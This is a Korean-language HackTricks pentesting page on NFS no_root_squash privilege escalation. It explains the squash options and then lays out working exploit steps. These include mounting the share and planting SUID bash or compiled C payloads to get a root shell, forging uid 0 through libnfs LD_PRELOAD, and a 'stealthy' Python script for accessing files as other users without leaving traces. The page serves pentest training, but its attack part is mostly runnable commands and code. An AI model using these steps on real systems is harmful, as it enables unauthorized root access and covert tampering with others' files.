# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Squashing 기본 정보

NFS는 일반적으로(특히 linux에서) 파일에 접근하기 위해 연결하는 client가 지정한 `uid`와 `gid`를 신뢰합니다(kerberos를 사용하지 않는 경우). 그러나 server에서 **이 동작을 변경**하도록 설정할 수 있습니다:

- **`all_squash`**: 모든 접근을 squash하여 모든 user와 group을 **`nobody`** (65534 unsigned / -2 signed)로 매핑합니다. 따라서 모든 사용자는 `nobody`가 되며 어떤 user도 사용되지 않습니다.
- **`root_squash`/`no_all_squash`**: Linux의 기본 설정이며 **uid 0 (root)**으로 접근하는 경우에만 squash합니다. 따라서 모든 `UID`와 `GID`는 신뢰되지만 `0`은 `nobody`로 squash됩니다(따라서 root impersonation은 불가능합니다).
- **``no_root_squash`**: 이 설정이 활성화되면 root user조차 squash하지 않습니다. 즉, 이 설정이 적용된 directory를 mount하면 root로 해당 directory에 접근할 수 있습니다.

**/etc/exports** 파일에서 **no_root_squash**로 설정된 directory를 찾았다면, **client로서** 해당 directory에 **access**하고 그 안에 **write**할 수 있으며, 마치 해당 machine의 local **root**인 것처럼 동작할 수 있습니다.

**NFS**에 대한 자세한 정보는 다음을 확인하세요:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

bash를 사용하는 Option 1:
- 해당 directory를 client machine에 **mount**한 다음, **root로서 mounted folder 안에** **/bin/bash** binary를 복사하고 **SUID** 권한을 부여한 뒤, **victim** machine에서 해당 bash binary를 실행합니다.
- NFS share 내부에서 root가 되려면 server에 **`no_root_squash`**가 설정되어 있어야 합니다.
- 그러나 활성화되어 있지 않다면, binary를 NFS share에 복사하고 escalation하려는 user로서 해당 binary에 SUID permission을 부여하여 다른 user로 escalate할 수 있습니다.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 using c compiled code:
- **해당 디렉터리를 mount**한 client machine에서 **root 권한으로 복사**하여, mount된 폴더 안에 SUID permission을 악용할 compiled payload를 배치하고, 해당 파일에 **SUID** 권한을 부여한 다음, **victim** machine에서 해당 binary를 **execute**합니다(여기에서 일부[ C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)를 확인할 수 있습니다).
- 이전과 동일한 restrictions
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> 사용자의 머신에서 victim machine으로 **tunnel을 생성할 수 있다면, 필요한 port를 tunnelling하여 privilege escalation에 Remote version을 계속 사용할 수 있습니다**.\
> 다음 trick은 `/etc/exports` 파일이 **IP를 지정하는 경우**를 위한 것입니다. 이 경우에는 어떤 상황에서도 **remote exploit을 사용할 수 없으며**, 이 **trick을 악용해야 합니다**.\
> exploit이 작동하기 위해 필요한 또 다른 조건은 **`/etc/export` 내부의 export가** **`insecure` flag를 사용해야 한다는 것입니다**.\
> --_`/etc/export`가 IP address를 지정하는 경우 이 trick이 작동할지는 확실하지 않습니다_--

### 기본 정보

이 시나리오는 로컬 machine에 mount된 NFS share를 exploit하는 과정을 다룹니다. NFSv3 specification의 flaw를 활용하면 client가 자신의 uid/gid를 지정할 수 있어, 잠재적으로 unauthorized access가 가능해집니다. exploit은 NFS RPC calls를 위조할 수 있는 library인 [libnfs](https://github.com/sahlberg/libnfs)를 사용합니다.

#### Library 컴파일

Library compilation steps는 kernel version에 따라 조정이 필요할 수 있습니다. 이 특정 사례에서는 fallocate syscalls가 주석 처리되었습니다. compilation process에는 다음 commands가 사용됩니다:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploit 수행

Exploit는 권한을 root로 상승시킨 후 shell을 실행하는 간단한 C 프로그램(`pwn.c`)을 생성하는 방식으로 진행됩니다. 프로그램을 컴파일한 다음, `ld_nfs.so`를 사용해 RPC 호출에서 uid를 위조하면서 생성된 바이너리(`a.out`)를 suid root로 share에 배치합니다:

1. **Exploit 코드 컴파일:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **exploit을 share에 배치하고 uid를 위조하여 권한을 수정합니다:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **root 권한을 얻기 위해 exploit 실행:**
```bash
/mnt/share/a.out
#root
```
### 보너스: Stealthy File Access를 위한 NFShell

root access를 획득한 후 소유권을 변경하지 않고 NFS share와 상호작용하려면(흔적을 남기지 않기 위해) Python script(nfsh.py)를 사용합니다. 이 script는 접근하려는 file의 uid와 일치하도록 uid를 조정하므로, permission 문제 없이 share의 file과 상호작용할 수 있습니다:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
다음과 같이 실행:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
